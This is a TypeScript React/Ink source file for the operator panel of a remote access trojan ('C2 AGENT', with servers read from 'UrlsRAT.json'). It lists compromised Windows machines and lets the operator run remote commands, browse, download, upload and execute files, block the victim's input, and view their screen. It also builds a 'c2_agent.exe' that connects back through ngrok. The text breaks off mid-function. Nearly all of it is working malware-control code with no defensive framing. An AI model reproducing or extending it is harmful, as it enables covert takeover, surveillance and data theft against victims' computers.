import React, { useCallback, useEffect, useRef } from "react";
import { Box, Text, useInput } from "ink";
import Spinner from "ink-spinner";
import fs from "fs";
import http from "http";
import path from "path";
import { exec } from "child_process";
import { PRIMARY, SECONDARY, DANGER, WARNING, UNFOCUS, ACCENT, MUTED, FOCUS } from "../theme.js";
import { useServices } from "../services/ServicesContext.js";
import { CursorTextInput, CursorInputField } from "./CursorTextInput.js";
import { useWindowState } from "../hooks/windowStore.js";
import type { C2Machine, C2FileEntry, C2Event } from "../../src/domain/ports/IC2RelayClient.js";

type Mode =
  | "idle"         // tela inicial — o usuario decide o que fazer
  | "connect_list" // lista de servidores salvos para conectar (UrlsRAT.json)
  | "connect_url"  // input para URL de servidor remoto (manual)
  | "compile_list" // lista de servidores salvos para compilar (UrlsRAT.json)
  | "starting"     // subindo Docker + conectando WS
  | "connecting"   // so conectando WS (remoto, sem docker)
  | "stopping"     // parando servidor
  | "ready"        // lista de maquinas
  | "machine_menu" // acoes da maquina selecionada
  | "file_browser" // navegacao de pastas
  | "command"      // execucao de comando
  | "building"     // compilando C2
  | "compile_url"  // pedindo URL do ngrok para compilar
  | "upload_path"  // caminho do arquivo local para upload
  | "upload_dest"  // caminho destino na maquina
  | "error";       // falha

const EMPTY: CursorInputField = { value: "", pos: 0 };

const MACHINE_ACTIONS = [
  "Navegar arquivos",
  "Executar comando",
  "Bloquear input",
  "Desbloquear input",
  "Ver tela (abre browser)",
  "Parar tela",
  "Upload arquivo",
  "Compilar C2 (.exe)",
  "Voltar",
] as const;

interface Props {
  height: number;
  id: string;
  isFocused?: boolean;
  onBlur?: () => void;
  onClose?: () => void;
}

export const C2Window: React.FC<Props> = ({
  height,
  id,
  isFocused = false,
  onBlur,
  onClose,
}) => {
  const { c2Controller } = useServices();

  const [mode,            setMode]            = useWindowState<Mode>(id, "c2mode", "idle");
  const [cursor,          setCursor]          = useWindowState(id, "c2cursor", 0);
  const [logs,            setLogs]            = useWindowState<string[]>(id, "c2logs", []);
  const [machines,        setMachines]        = useWindowState<C2Machine[]>(id, "c2machines", []);
  const [selectedMachine, setSelectedMachine] = useWindowState<C2Machine | null>(id, "c2sel", null);
  const [serverUrl,       setServerUrl]       = useWindowState(id, "c2url", "");
  const [cmdField,        setCmdField]        = useWindowState<CursorInputField>(id, "c2cmdF", EMPTY);
  const [cmdOutput,       setCmdOutput]       = useWindowState(id, "c2cmdOut", "");
  const [buildPath,       setBuildPath]       = useWindowState(id, "c2build", "");
  const [currentPath,     setCurrentPath]     = useWindowState(id, "c2path", "C:\\");
  const [fileEntries,     setFileEntries]     = useWindowState<C2FileEntry[]>(id, "c2files", []);
  const [fileCursor,      setFileCursor]      = useWindowState(id, "c2fcur", 0);
  const [fileLoading,     setFileLoading]     = useWindowState(id, "c2fload", false);
  const [uploadSrcField,  setUploadSrcField]  = useWindowState<CursorInputField>(id, "c2upSrc", EMPTY);
  const [uploadDstField,  setUploadDstField]  = useWindowState<CursorInputField>(id, "c2upDst", EMPTY);
  const [uploadSrcPath,   setUploadSrcPath]   = useWindowState(id, "c2upSrcP", "");
  const [compileUrlField, setCompileUrlField] = useWindowState<CursorInputField>(id, "c2cmpUrl", EMPTY);
  const [connectUrlField, setConnectUrlField] = useWindowState<CursorInputField>(id, "c2connUrl", EMPTY);
  const [savedServers,    setSavedServers]    = useWindowState<Array<{domain:string;token:string}>>(id, "c2saved", []);
  const [errorMsg,        setErrorMsg]        = useWindowState(id, "c2err", "");
  const [cancelling,      setCancelling]      = useWindowState(id, "c2cancel", false);

  // cancelRef: flag mutable para cancelar operacoes async sem depender de closure stale
  const cancelRef = useRef(false);
  const unsubRef  = useRef<(() => void) | null>(null);

  // Apenas limpeza na desmontagem
  useEffect(() => {
    return () => { unsubRef.current?.(); };
  }, []);

  const addLog = useCallback((msg: string) => {
    setLogs((prev) => [...prev.slice(-150), msg]);
  }, [setLogs]);

  const handleEvent = useCallback((event: C2Event) => {
    switch (event.type) {
      case "welcome":
        setMachines(event.machines);
        addLog(`[+] Conectado — ${event.machines.length} maquinas online`);
        setMode("ready");
        setCursor(0);
        break;
      case "machines":
        setMachines(event.list);
        break;
      case "machine_connected":
        setMachines((prev) => [...prev, event.machine]);
        addLog(`[+] Nova maquina: ${event.machine.name} (${event.machine.id})`);
        break;
      case "machine_disconnected":
        setMachines((prev) => prev.filter((m) => m.id !== event.machine_id));
        addLog(`[-] Maquina desconectou: ${event.machine_id}`);
        break;
      case "cmd_result":
        setCmdOutput(event.output);
        addLog(`[*] Output recebido (${event.output.length} chars)`);
        break;
      case "file_list_result":
        setFileEntries(event.entries);
        setFileCursor(0);
        setFileLoading(false);
        addLog(`[*] ${event.entries.length} itens em ${event.path}`);
        break;
      case "file_data":
        if (event.error) {
          addLog(`[!] Download falhou: ${event.error}`);
        } else {
          addLog(`[+] Arquivo recebido: ${event.path} (${event.size} bytes)`);
          if (event.data) {
            const localPath = "./" + (event.path?.split("\\").pop() || "download");
            fs.writeFileSync(localPath, Buffer.from(event.data, "base64"));
            addLog(`[+] Salvo em: ${localPath}`);
          }
        }
        break;
      case "file_upload_result":
        addLog(event.ok
          ? `[+] Upload OK: ${event.path}`
          : `[!] Upload falhou: ${event.error}`);
        break;
      case "file_exec_result":
        addLog(event.ok
          ? `[+] Executado: ${event.path}`
          : `[!] Execucao falhou: ${event.error}`);
        break;
      case "input_status":
        addLog(`[*] Input ${event.blocked ? "BLOQUEADO" : "DESBLOQUEADO"}`);
        break;
      case "error":
        addLog(`[!] Erro: ${event.error}`);
        break;
    }
  }, [addLog, setMachines, setCmdOutput, setFileEntries, setFileCursor, setFileLoading, setMode, setCursor]);

  // Sobe Docker + conecta WS
  const doStartAndConnect = useCallback(async () => {
    cancelRef.current = false;
    setCancelling(false);
    setMode("starting");
    addLog("[c2] Iniciando servidor Ruby C2...");

    const result = await c2Controller.startServer(addLog);

    if (cancelRef.current) {
      addLog("[c2] Cancelado — parando servidor...");
      await c2Controller.stopServer();
      setMode("idle");
      setCursor(0);
      setCancelling(false);
      return;
    }

    if (result.isFailure) {
      setErrorMsg(result.error!);
      setMode("error");
      return;
    }

    const { wsUrl, token } = result.value!;
    setServerUrl(wsUrl);
    addLog(`[c2] Conectando a ${wsUrl}...`);

    try {
      await c2Controller.relay.connect(wsUrl, token);
      unsubRef.current?.();
      unsubRef.current = c2Controller.relay.onEvent(handleEvent);
    } catch (e: unknown) {
      const msg = e instanceof Error ? e.message : String(e);
      addLog(`[!] Falha ao conectar: ${msg}`);
      setErrorMsg(`Servidor subiu mas conexao WS falhou: ${msg}`);
      setMode("error");
    }
  }, [c2Controller, addLog, handleEvent, setMode, setServerUrl, setErrorMsg, setCancelling]);

  // Conecta em servidor remoto existente (sem docker)
  const doConnectRemote = useCallback(async (wsUrl: string, token?: string) => {
    cancelRef.current = false;
    setCancelling(false);
    setMode("connecting");
    setServerUrl(wsUrl);
    addLog(`[c2] Conectando a ${wsUrl}...`);

    try {
      await c2Controller.relay.connect(wsUrl, token);
      if (cancelRef.current) {
        c2Controller.relay.disconnect();
        addLog("[c2] Conexao cancelada");
        setServerUrl("");
        setMode("idle");
        setCursor(0);
        setCancelling(false);
        return;
      }
      unsubRef.current?.();
      unsubRef.current = c2Controller.relay.onEvent(handleEvent);
    } catch (e: unknown) {
      const msg = e instanceof Error ? e.message : String(e);
      addLog(`[!] Falha ao conectar: ${msg}`);
      setErrorMsg(`Conexao falhou: ${msg}`);
      setMode("error");
      setCancelling(false);
    }
  }, [c2Controller, addLog, handleEvent, setMode, setServerUrl, setErrorMsg, setCancelling]);

  // Para o servidor Docker e desconecta
  const doStop = useCallback(async () => {
    setMode("stopping");
    addLog("[c2] Parando servidor...");
    c2Controller.relay.disconnect();
    unsubRef.current?.();
    unsubRef.current = null;
    await c2Controller.stopServer();
    addLog("[c2] Servidor parado");
    setMachines([]);
    setSelectedMachine(null);
    setServerUrl("");
    setMode("idle");
    setCursor(0);
  }, [c2Controller, addLog, setMode, setMachines, setSelectedMachine, setServerUrl]);

  const navigateTo = useCallback((filePath: string) => {
    if (!selectedMachine) return;
    setCurrentPath(filePath);
    setFileLoading(true);
    setFileEntries([]);
    setFileCursor(0);
    c2Controller.relay.fileList(selectedMachine.id, filePath);
  }, [selectedMachine, c2Controller, setCurrentPath, setFileLoading, setFileEntries, setFileCursor]);

  const doCompile = useCallback(async (externalUrl: string) => {
    cancelRef.current = false;
    setCancelling(false);
    setMode("building");
    setBuildPath("");
    addLog("[c2] Compilando C2 agent...");

    const result = await c2Controller.compile(externalUrl, addLog);

    if (cancelRef.current) {
      addLog("[c2] Compilacao cancelada");
      setMode("machine_menu");
      setCursor(0);
      setCancelling(false);
      return;
    }

    if (result.isSuccess) {
      setBuildPath(result.value!.binaryPath);
      addLog(`[+] c2_agent.exe pronto: ${result.value!.binaryPath}`);
    }
    setMode("machine_menu");
    setCursor(0);
  }, [c2Controller, addLog, setMode, setBuildPath, setCursor, setCancelling]);

  // Menu idle adapta ao estado de conexao atual
  const isConnected = c2Controller.relay.isConnected();
  const idleItems = isConnected
    ? ["Abrir painel de maquinas", "Parar servidor", "Fechar"] as const
    : ["Iniciar servidor local (docker)", "Conectar em servidor remoto", "Fechar"] as const;

  useInput((input, key) => {
    // q OU Esc = voltar/cancelar em qualquer contexto
    const back = key.escape || input === "q";

    // Durante operacoes async: apenas permite cancelar
    if (mode === "starting" || mode === "building" || mode === "connecting") {
      if (back && !cancelling) {
        cancelRef.current = true;
        setCancelling(true);
        addLog("[c2] Cancelando...");
      }
      return;
    }

    // Durante stopping: bloqueia tudo
    if (mode === "stopping") return;

    // ── Error ───────────────────────────────────────────────────────────
    if (mode === "error") {
      if (key.return) { doStartAndConnect(); return; }
      if (back)       { setMode("idle"); setCursor(0); return; }
      return;
    }

    // ── Idle ────────────────────────────────────────────────────────────
    if (mode === "idle") {
      const total = idleItems.length;
      if (key.upArrow)   { setCursor((i) => Math.max(0, i - 1)); return; }
      if (key.downArrow) { setCursor((i) => Math.min(total - 1, i + 1)); return; }
      if (key.escape)    { onBlur?.(); return; }
      if (key.return) {
        const safeCursor = Math.min(cursor, total - 1);
        const action = idleItems[safeCursor];
        if (action === "Fechar") { onClose?.(); return; }
        if (isConnected) {
          if (action === "Abrir painel de maquinas") {
            if (!unsubRef.current) {
              unsubRef.current = c2Controller.relay.onEvent(handleEvent);
            }
            c2Controller.relay.listMachines();
            setMode("ready");
            setCursor(0);
          } else if (action === "Parar servidor") {
            doStop();
          }
        } else {
          if (action === "Iniciar servidor local (docker)") {
            doStartAndConnect();
          } else if (action === "Conectar em servidor remoto") {
            setSavedServers(loadSavedServers());
            setConnectUrlField(EMPTY);
            setMode("connect_list");
            setCursor(0);
          }
        }
      }
      return;
    }

    // ── Connect list (UrlsRAT.json) ─────────────────────────────────────
    if (mode === "connect_list") {
      // servers + "Digitar manualmente" + "Voltar"
      const total = savedServers.length + 2;
      if (key.upArrow)   { setCursor((i) => Math.max(0, i - 1)); return; }
      if (key.downArrow) { setCursor((i) => Math.min(total - 1, i + 1)); return; }
      if (back)          { setMode("idle"); setCursor(0); return; }
      if (key.return) {
        if (cursor < savedServers.length) {
          const srv = savedServers[cursor];
          doConnectRemote(`wss://${srv.domain}`, srv.token);
        } else if (cursor === savedServers.length) {
          setMode("connect_url");
          setCursor(0);
        } else {
          setMode("idle");
          setCursor(0);
        }
      }
      return;
    }

    // ── Connect URL (remoto) ────────────────────────────────────────────
    if (mode === "connect_url") {
      if (back) { setMode("idle"); setCursor(0); return; }
      if (key.return) {
        const url = connectUrlField.value.trim();
        if (!url) { addLog("[!] URL obrigatoria"); return; }
        const wsUrl = url.startsWith("ws") ? url : `ws://${url}`;
        doConnectRemote(wsUrl);
      }
      return;
    }

    // ── Machine list ────────────────────────────────────────────────────
    if (mode === "ready") {
      // machines + "Compilar C2" + "Parar servidor"
      const total = machines.length + 2;
      if (key.upArrow)   { setCursor((i) => Math.max(0, i - 1)); return; }
      if (key.downArrow) { setCursor((i) => Math.min(total - 1, i + 1)); return; }
      if (back)          { setMode("idle"); setCursor(0); return; }
      if (key.return) {
        if (cursor < machines.length) {
          setSelectedMachine(machines[cursor]);
          setMode("machine_menu");
          setCursor(0);
        } else if (cursor === machines.length) {
          setSavedServers(loadSavedServers());
          setCompileUrlField(EMPTY);
          setMode("compile_list");
          setCursor(0);
        } else {
          doStop();
        }
      }
      return;
    }

    // ── Machine menu ────────────────────────────────────────────────────
    if (mode === "machine_menu") {
      if (key.upArrow)   { setCursor((i) => Math.max(0, i - 1)); return; }
      if (key.downArrow) { setCursor((i) => Math.min(MACHINE_ACTIONS.length - 1, i + 1)); return; }
      if (back)          { setSelectedMachine(null); setMode("ready"); setCursor(0); return; }
      if (key.return && selectedMachine) {
        const action = MACHINE_ACTIONS[cursor];
        const mid = selectedMachine.id;
        switch (action) {
          case "Navegar arquivos":
            navigateTo("C:\\");
            setMode("file_browser");
            break;
          case "Executar comando":
            setCmdField(EMPTY);
            setCmdOutput("");
            setMode("command");
            break;
          case "Bloquear input":
            c2Controller.relay.blockInput(mid);
            addLog("[*] Enviando block_input...");
            break;
          case "Desbloquear input":
            c2Controller.relay.unblockInput(mid);
            addLog("[*] Enviando unblock_input...");
            break;
          case "Ver tela (abre browser)":
            c2Controller.relay.screenStart(mid, 5);
            addLog("[*] Screen capture iniciado — abrindo viewer...");
            launchViewer(serverUrl, mid, addLog);
            break;
          case "Parar tela":
            c2Controller.relay.screenStop(mid);
            addLog("[*] Screen capture parado");
            break;
          case "Upload arquivo":
            setUploadSrcField(EMPTY);
            setUploadDstField(EMPTY);
            setMode("upload_path");
            break;
          case "Compilar C2 (.exe)":
            setSavedServers(loadSavedServers());
            setCompileUrlField(EMPTY);
            setMode("compile_list");
            setCursor(0);
            break;
          case "Voltar":
            setSelectedMachine(null);
            setMode("ready");
            setCursor(0);
            break;
        }
      }
      return;
    }

    // ── Compile list (UrlsRAT.json) ─────────────────────────────────────
    if (mode === "compile_list") {
      // servers + "Digitar manualmente" + "Voltar"
      const total = savedServers.length + 2;
      if (key.upArrow)   { setCursor((i) => Math.max(0, i - 1)); return; }
      if (key.downArrow) { setCursor((i) => Math.min(total - 1, i + 1)); return; }
      if (back) {
        setMode(selectedMachine ? "machine_menu" : "ready");
        setCursor(0);
        return;
      }
      if (key.return) {
        if (cursor < savedServers.length) {
          doCompile(`wss://${savedServers[cursor].domain}`);
        } else if (cursor === savedServers.length) {
          setMode("compile_url");
          setCursor(0);
        } else {
          setMode(selectedMachine ? "machine_menu" : "ready");
          setCursor(0);
        }
      }
      return;
    }

    // ── Compile URL (ngrok) ─────────────────────────────────────────────
    if (mode === "compile_url") {
      if (back) {
        setMode(selectedMachine ? "machine_menu" : "ready");
        setCursor(0);
        return;
      }
      if (key.return) {
        const url = compileUrlField.value.trim();
        if (!url) { addLog("[!] URL do ngrok obrigatoria"); return; }
        const wsUrl = url.startsWith("ws") ? url : `wss://${url}`;
        doCompile(wsUrl);
      }
      return;
    }

    // ── File browser ────────────────────────────────────────────────────
    if (mode === "file_browser") {
      if (fileLoading) return;
      if (back)          { setMode("machine_menu"); setCursor(0); return; }
      if (key.upArrow)   { setFileCursor((i) => Math.max(0, i - 1)); return; }
      if (key.downArrow) { setFileCursor((i) => Math.min(fileEntries.length - 1, i + 1)); return; }

      if (key.return && selectedMachine && fileEntries.length > 0) {
        const entry = fileEntries[fileCursor];
        if (!entry) return;
        if (entry.name === "..") {
          const parts = currentPath.replace(/[\\/]+$/, "").split(/[\\/]/);
          if (parts.length > 1) {
            parts.pop();
            const parent = parts.join("\\") || "C:\\";
            navigateTo(parent.endsWith("\\") ? parent : parent + "\\");
          }
          return;
        }
        if (entry.dir) {
          const sep = currentPath.endsWith("\\") ? "" : "\\";
          navigateTo(currentPath + sep + entry.name);
        } else {
          const filePath = currentPath + (currentPath.endsWith("\\") ? "" : "\\") + entry.name;
          c2Controller.relay.fileDownload(selectedMachine.id, filePath);
          addLog(`[*] Baixando: ${filePath}`);
        }
        return;
      }

      if (input === "x" && selectedMachine && fileEntries[fileCursor]) {
        const entry = fileEntries[fileCursor];
        if (!entry.dir) {
          const filePath = currentPath + (currentPath.endsWith("\\") ? "" : "\\") + entry.name;
          c2Controller.relay.fileExec(selectedMachine.id, filePath);
          addLog(`[*] Executando: ${filePath}`);
        }
        return;
      }
      return;
    }

    // ── Command ─────────────────────────────────────────────────────────
    if (mode === "command") {
      if (back) { setMode("machine_menu"); setCursor(0); return; }
      if (key.return && selectedMachine) {
        const cmd = cmdField.value.trim();
        if (!cmd) return;
        c2Controller.relay.sendCommand(selectedMachine.id, cmd);
        addLog(`[>] ${cmd}`);
        setCmdField(EMPTY);
      }
      return;
    }

    // ── Upload path ─────────────────────────────────────────────────────
    if (mode === "upload_path") {
      if (back) { setMode("machine_menu"); setCursor(0); return; }
      if (key.return) {
        const src = uploadSrcField.value.trim();
        if (!src) { addLog("[!] Caminho obrigatorio"); return; }
        setUploadSrcPath(src);
        setUploadDstField({ value: "C:\\" + src.split(/[\\/]/).pop(), pos: 0 });
        setMode("upload_dest");
      }
      return;
    }

    // ── Upload dest ─────────────────────────────────────────────────────
    if (mode === "upload_dest") {
      if (back) { setMode("upload_path"); return; }
      if (key.return && selectedMachine) {
        const dest = uploadDstField.value.trim();
        if (!dest) { addLog("[!] Destino obrigatorio"); return; }
        try {
          const data = fs.readFileSync(uploadSrcPath);
          const b64 = data.toString("base64");
          c2Controller.relay.fileUpload(selectedMachine.id, dest, b64);
          addLog(`[*] Enviando ${uploadSrcPath} → ${dest} (${data.length} bytes)`);
        } catch (e: unknown) {
          addLog(`[!] Erro lendo arquivo local: ${e instanceof Error ? e.message : String(e)}`);
        }
        setMode("machine_menu");
        setCursor(0);
      }
      return;
    }

  }, { isActive: isFocused });

  // ── Render ─────────────────────────────────────────────────────────────

  const displayLogs = logs.slice(-Math.max(3, Math.floor(height - 18)));
  const borderColor = isFocused ? DANGER : UNFOCUS;

  return (
    <Box
      borderStyle={isFocused ? "double" : "round"}
      borderColor={borderColor}
      flexDirection="column"
      flexGrow={1}
      flexShrink={1}
      height={height}
      paddingX={1}
      paddingY={0}
      overflow="hidden"
    >
      {/* Header */}
      <Box flexDirection="row" gap={1}>
        <Text color={isFocused ? DANGER : UNFOCUS} bold>
          {mode === "starting" || mode === "building" || mode === "connecting"
            ? <><Spinner /> C2 AGENT</>
            : "C2 AGENT"}
        </Text>
        {selectedMachine && <Text color={ACCENT}>[{selectedMachine.name}]</Text>}
        {mode === "ready"   && <Text color={MUTED}>({machines.length} online)</Text>}
        {isConnected && serverUrl && mode !== "idle" && (
          <Text color={SECONDARY} dimColor>{serverUrl}</Text>
        )}
      </Box>

      {/* ── Idle ── */}
      {mode === "idle" && (
        <Box flexDirection="column" marginTop={1}>
          <Text color={isConnected ? ACCENT : MUTED} dimColor>
            {isConnected
              ? `[●] Conectado — ${serverUrl || "servidor ativo"}`
              : "[○] Sem conexao ativa"}
          </Text>
          <Box marginTop={1} flexDirection="column">
            {idleItems.map((item, i) => {
              const sel = i === cursor;
              return (
                <Text key={item} color={sel ? DANGER : MUTED} bold={sel}>
                  {sel ? "> " : "  "}{item}
                </Text>
              );
            })}
          </Box>
          <Text color={UNFOCUS} dimColor marginTop={1}>Enter = selecionar  |  Esc = voltar ao menu</Text>
        </Box>
      )}

      {/* ── Connect list (UrlsRAT.json) ── */}
      {mode === "connect_list" && (
        <Box flexDirection="column" marginTop={1}>
          <Text color={SECONDARY} bold>Servidores salvos (config/UrlsRAT.json):</Text>
          {savedServers.length === 0 && (
            <Text color={MUTED} dimColor>Nenhum servidor configurado</Text>
          )}
          {savedServers.map((srv, i) => {
            const sel = i === cursor;
            return (
              <Text key={srv.domain + i} color={sel ? DANGER : SECONDARY} bold={sel}>
                {sel ? "> " : "  "}{srv.domain}
              </Text>
            );
          })}
          <Text color={cursor === savedServers.length ? ACCENT : MUTED} bold={cursor === savedServers.length}>
            {cursor === savedServers.length ? "> " : "  "}Digitar URL manualmente
          </Text>
          <Text color={cursor === savedServers.length + 1 ? DANGER : MUTED} bold={cursor === savedServers.length + 1}>
            {cursor === savedServers.length + 1 ? "> " : "  "}Voltar
          </Text>
          <Text color={UNFOCUS} dimColor>Enter = selecionar  |  q/Esc = voltar</Text>
        </Box>
      )}

      {/* ── Connect URL (remoto) ── */}
      {mode === "connect_url" && (
        <Box flexDirection="column" marginTop={1}>
          <Text color={SECONDARY} bold>URL do servidor C2 remoto:</Text>
          <Text color={MUTED} dimColor>ex: ws://10.0.0.1:4444  ou  wss://seu-server.com</Text>
          <CursorTextInput field={connectUrlField} setField={setConnectUrlField} isActive={isFocused} color={FOCUS} />
          <Text color={UNFOCUS} dimColor>Enter = conectar  |  q/Esc = voltar</Text>
        </Box>
      )}

      {/* ── Starting (docker + WS) ── */}
      {mode === "starting" && (
        <Box flexDirection="column" marginTop={1}>
          {cancelling
            ? <Text color={WARNING}><Spinner /> Cancelando — aguarde o docker parar...</Text>
            : <Text color={WARNING}><Spinner /> Subindo servidor Ruby C2 (docker compose)...</Text>}
          <Text color={MUTED} dimColor>Aguarde o health check passar</Text>
          {!cancelling && <Text color={UNFOCUS} dimColor marginTop={1}>q/Esc = cancelar</Text>}
        </Box>
      )}

      {/* ── Connecting (WS remoto) ── */}
      {mode === "connecting" && (
        <Box flexDirection="column" marginTop={1}>
          {cancelling
            ? <Text color={WARNING}><Spinner /> Cancelando...</Text>
            : <Text color={WARNING}><Spinner /> Conectando a {serverUrl}...</Text>}
          {!cancelling && <Text color={UNFOCUS} dimColor marginTop={1}>q/Esc = cancelar</Text>}
        </Box>
      )}

      {/* ── Stopping ── */}
      {mode === "stopping" && (
        <Box flexDirection="column" marginTop={1}>
          <Text color={WARNING}><Spinner /> Parando servidor...</Text>
        </Box>
      )}

      {/* ── Error ── */}
      {mode === "error" && (
        <Box flexDirection="column" marginTop={1}>
          <Text color={DANGER} bold>Falha:</Text>
          <Text color={WARNING} wrap="truncate">{errorMsg}</Text>
          <Text color={UNFOCUS} dimColor>Enter = tentar novamente  |  q/Esc = voltar</Text>
        </Box>
      )}

      {/* ── Machine list ── */}
      {mode === "ready" && (
        <Box flexDirection="column" marginTop={1}>
          <Text color={ACCENT} dimColor>
            Servidor: {serverUrl || "localhost:4444"} — use ngrok para expor
          </Text>
          {machines.length === 0 && (
            <Text color={MUTED}>Nenhuma maquina conectada. Aguardando agentes...</Text>
          )}
          {machines.map((m, i) => {
            const sel = i === cursor;
            return (
              <Text key={m.id} color={sel ? DANGER : SECONDARY} bold={sel}>
                {sel ? "> " : "  "}{m.name} | {m.os} | {m.ip} | {m.id.slice(0, 8)}
              </Text>
            );
          })}
          <Text color={cursor === machines.length ? ACCENT : MUTED} bold={cursor === machines.length}>
            {cursor === machines.length ? "> " : "  "}Compilar C2 (.exe)
          </Text>
          <Text color={cursor === machines.length + 1 ? WARNING : MUTED} bold={cursor === machines.length + 1}>
            {cursor === machines.length + 1 ? "> " : "  "}Parar servidor
          </Text>
          <Text color={UNFOCUS} dimColor>Enter = selecionar  |  q/Esc = voltar</Text>
        </Box>
      )}

      {/* ── Machine menu ── */}
      {mode === "machine_menu" && (
        <Box flexDirection="column" marginTop={1}>
          {MACHINE_ACTIONS.map((act, i) => {
            const sel = i === cursor;
            return (
              <Text key={act} color={sel ? DANGER : MUTED} bold={sel}>
                {sel ? "> " : "  "}{act}
              </Text>
            );
          })}
          <Text color={UNFOCUS} dimColor>Enter = selecionar  |  q/Esc = voltar</Text>
        </Box>
      )}

      {/* ── Compile list (UrlsRAT.json) ── */}
      {mode === "compile_list" && (
        <Box flexDirection="column" marginTop={1}>
          <Text color={SECONDARY} bold>Servidor alvo do agente C2:</Text>
          <Text color={MUTED} dimColor>O .exe vai se conectar neste servidor</Text>
          {savedServers.length === 0 && (
            <Text color={MUTED} dimColor>Nenhum servidor em config/UrlsRAT.json</Text>
          )}
          {savedServers.map((srv, i) => {
            const sel = i === cursor;
            return (
              <Text key={srv.domain + i} color={sel ? DANGER : SECONDARY} bold={sel}>
                {sel ? "> " : "  "}{srv.domain}
              </Text>
            );
          })}
          <Text color={cursor === savedServers.length ? ACCENT : MUTED} bold={cursor === savedServers.length}>
            {cursor === savedServers.length ? "> " : "  "}Digitar URL manualmente
          </Text>
          <Text color={cursor === savedServers.length + 1 ? DANGER : MUTED} bold={cursor === savedServers.length + 1}>
            {cursor === savedServers.length + 1 ? "> " : "  "}Voltar
          </Text>
          <Text color={UNFOCUS} dimColor>Enter = selecionar  |  q/Esc = voltar</Text>
        </Box>
      )}

      {/* ── Compile URL (ngrok) ── */}
      {mode === "compile_url" && (
        <Box flexDirection="column" marginTop={1}>
          <Text color={SECONDARY} bold>URL publica do ngrok (ou servidor externo):</Text>
          <Text color={MUTED} dimColor>ex: 0.tcp.ngrok.io:12345  ou  wss://seu-server.com</Text>
          <CursorTextInput field={compileUrlField} setField={setCompileUrlField} isActive={isFocused} color={FOCUS} />
          <Text color={UNFOCUS} dimColor>Enter = compilar  |  q/Esc = voltar</Text>
        </Box>
      )}

      {/* ── File browser ── */}
      {mode === "file_browser" && (
        <Box flexDirection="column" marginTop={1}>
          <Text color={ACCENT} bold>{currentPath}</Text>
          {fileLoading && <Text color={WARNING}><Spinner /> Carregando...</Text>}
          <Box flexDirection="column" overflow="hidden" height={Math.max(3, height - 12)}>
            {fileEntries.slice(
              Math.max(0, fileCursor - Math.floor((height - 14) / 2)),
              Math.max(0, fileCursor - Math.floor((height - 14) / 2)) + height - 12,
            ).map((entry, idx) => {
              const realIdx = Math.max(0, fileCursor - Math.floor((height - 14) / 2)) + idx;
              const sel = realIdx === fileCursor;
              const icon = entry.name === ".." ? ".." : entry.dir ? "[D]" : "   ";
              const sizeStr = entry.dir ? "" : ` (${formatSize(entry.size)})`;
              return (
                <Text
                  key={entry.name + realIdx}
                  color={sel ? (entry.dir ? ACCENT : FOCUS) : (entry.dir ? SECONDARY : MUTED)}
                  bold={sel}
                >
                  {sel ? "> " : "  "}{icon} {entry.name}{sizeStr}
                </Text>
              );
            })}
          </Box>
          <Text color={UNFOCUS} dimColor>Enter=abrir/baixar | x=executar | q/Esc=voltar</Text>
        </Box>
      )}

      {/* ── Command ── */}
      {mode === "command" && (
        <Box flexDirection="column" marginTop={1}>
          <Text color={SECONDARY} bold>Comando:</Text>
          <CursorTextInput field={cmdField} setField={setCmdField} isActive={isFocused} color={FOCUS} />
          {cmdOutput && (
            <Box flexDirection="column" marginTop={1} overflow="hidden" height={Math.max(2, height - 14)}>
              {cmdOutput.split("\n").slice(-(height - 14)).map((line, i) => (
                <Text key={i} color={MUTED} wrap="truncate">{line}</Text>
              ))}
            </Box>
          )}
          <Text color={UNFOCUS} dimColor>Enter = enviar  |  q/Esc = voltar</Text>
        </Box>
      )}

      {/* ── Upload path ── */}
      {mode === "upload_path" && (
        <Box flexDirection="column" marginTop={1}>
          <Text color={SECONDARY} bold>Caminho do arquivo local:</Text>
          <CursorTextInput field={uploadSrcField} setField={setUploadSrcField} isActive={isFocused} color={FOCUS} />
          <Text color={UNFOCUS} dimColor>Enter = proximo  |  q/Esc = voltar</Text>
        </Box>
      )}
      {mode === "upload_dest" && (
        <Box flexDirection="column" marginTop={1}>
          <Text color={SECONDARY} bold>Destino na maquina remota:</Text>
          <CursorTextInput field={uploadDstField} setField={setUploadDstField} isActive={isFocused} color={FOCUS} />
          <Text color={UNFOCUS} dimColor>Enter = enviar  |  q/Esc = voltar</Text>
        </Box>
      )}

      {/* ── Building ── */}
      {mode === "building" && (
        <Box flexDirection="column" marginTop={1}>
          {cancelling
            ? <Text color={WARNING}><Spinner /> Cancelando compilacao...</Text>
            : <Text color={WARNING}><Spinner /> Compilando C2 via Docker...</Text>}
          {!cancelling && <Text color={UNFOCUS} dimColor marginTop={1}>q/Esc = cancelar</Text>}
        </Box>
      )}

      {buildPath && (
        <Box marginTop={1}>
          <Text color={ACCENT} wrap="truncate">EXE: {buildPath}</Text>
        </Box>
      )}

      {/* Logs */}
      <Box flexDirection="column" flexGrow={1} overflow="hidden" marginTop={1}>
        {displayLogs.map((log, i) => {
          const color = log.startsWith("[!]")     ? WARNING
                      : log.startsWith("[ERROR]") ? DANGER
                      : log.startsWith("[+]")     ? ACCENT
                      : log.startsWith("[*]")     ? FOCUS
                      : log.startsWith("[>]")     ? PRIMARY
                      : log.startsWith("[-]")     ? DANGER
                      : MUTED;
          return <Text key={i} wrap="truncate" color={color}>{log}</Text>;
        })}
      </Box>
    </Box>
  );
};

function loadSavedServers(): Array<{domain: string; token: string}> {
  try {
    const filePath = path.join(process.cwd(), "config", "UrlsRAT.json");
    if (!fs.existsSync(filePath)) return [];
    const raw = fs.readFileSync(filePath, "utf-8");
    return JSON.parse(raw) as Array<{domain: string; token: string}>;
  } catch {
    return [];
  }
}

function formatSize(bytes: number): string {
  if (bytes < 1024) return `${bytes}B`;
  if (bytes < 1024 * 1024) return `${(bytes / 1024).toFixed(1)}KB`;
  if (bytes < 1024 * 1024 * 1024) return `${(bytes / (1024 * 1024)).toFixed(1)}MB`;
  return `${(bytes / (1024 * 1024 * 1024)).toFixed(1)}GB`;
}

let viewerServer: http.Server | null = null;

function launchViewer(serverUrl: string, machineId: string, onLog: (msg: string) => void): void {
  const viewerPath = path.resolve(process.cwd(), "viewer", "index.html");
  if (!fs.existsSync(viewerPath)) {
    onLog("[!] viewer/index.html nao encontrado");
    return;
  }

  if (viewerServer) {
    viewerServer.close();
    viewerServer = null;
  }

  const html = fs.readFileSync(viewerPath, "utf-8")
    .replace("__WS_URL__", serverUrl)
    .replace("__MACHINE_ID__", machineId);

  const server = http.createServer((_req: unknown, res: http.ServerResponse) => {
